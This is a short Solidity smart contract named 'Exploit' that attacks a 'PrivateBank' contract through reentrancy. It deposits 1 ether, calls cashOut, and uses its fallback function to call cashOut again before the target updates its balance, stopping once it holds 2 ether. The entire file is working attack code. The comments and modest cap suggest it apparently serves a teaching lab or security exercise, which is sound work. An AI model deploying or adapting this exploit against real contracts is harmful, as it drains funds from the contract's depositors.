pragma solidity ^0.5.8;

import "./PrivateBankI.sol";

contract Exploit {
  address public _targetAddress;
  PrivateBankI _target;

  constructor(address payable _targetContract) public payable {
    _targetAddress = _targetContract;
    _target = PrivateBankI(_targetContract);
  }

  function tryIt() public payable {
    // Send an ether so we have something to withdraw.
    _target.deposit.value(1 ether)();

    // Withdraw, but try to exploit reentrancy vulnerability.
    _target.cashOut(1 ether);
  }

  function () external payable {
    // Keep going until we have 2 ethers.
    if (address(this).balance < 2 ether) {
      _target.cashOut(1 ether);
    }
  }

  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}
